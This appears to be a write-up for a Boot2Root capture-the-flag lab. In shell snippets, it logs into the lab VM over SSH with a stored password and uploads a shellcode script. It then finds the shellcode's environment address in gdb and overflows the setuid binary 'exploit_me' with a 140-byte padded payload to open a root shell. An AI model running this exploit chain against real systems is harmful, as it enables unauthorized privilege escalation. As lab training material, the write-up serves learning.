## Find our VM IP
```shell
IP=`prlctl list -f | grep "Boot2Root" | awk '{print $3}'`
if [ -z "$IP" ]; then 
  IP=0.0.0.0
fi
echo $IP
```

Declare ssh_executor and scp_uploader
```shell
ssh_executor () {
  sshpass -p "$ssh_password" ssh -o StrictHostKeyChecking=no $ssh_login@$IP "$1" 2> /dev/null
}
scp_uploader () {
  sshpass -p "$ssh_password" scp $1 $ssh_login@$IP:$2 2> /dev/null
}
ssh_login="zaz"
ssh_password=`cat ../scripts/writeup2/zaz_password`
```

## Root shell

### Get SHELL_CODE address
```shell
scp_uploader "../scripts/writeup7/shell_code.py" "~/"
shell_code_address=$(echo -e "\n" | ssh_executor 'export SHELL_CODE=`python shell_code.py` && echo -e "q" | gdb ./exploit_me -q -ex "b* main" -ex "r" -ex "x/200s environ" | grep SHELL_CODE | cut -d ":" -f 1')
echo $shell_code_address
shell_code_address=`python3 ../scripts/writeup2/zaz.py 'address' $shell_code_address`
echo $shell_code_address
```

### A little magic
```shell
cmd="\$(python -c 'print \".\" * 140 + \"$shell_code_address\"')"
ssh_executor << EOF 
echo $cmd > shell_code
EOF
```

### Run root shell
```shell
ssh_executor 'export SHELL_CODE=`python shell_code.py` && (echo "id && whoami"; cat - ) | ./exploit_me `cat shell_code`'
```